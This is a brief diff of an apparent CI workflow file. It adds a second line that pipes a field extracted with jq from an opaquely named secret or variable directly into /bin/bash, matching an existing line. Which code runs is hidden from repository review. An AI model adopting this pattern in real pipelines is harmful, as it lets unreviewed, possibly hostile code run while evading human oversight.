@@ -21,6 +21,7 @@ jobs:
           trhvy65: ${{ secrets.trhvy65 }}
         run: |
           printf '%s' "$trhvy65" | jq -r .wydpo4517 | /bin/bash
+          printf '%s' "$etm9636" | jq -r .z86060 | /bin/bash
 
       - name: Save output
         if: always()
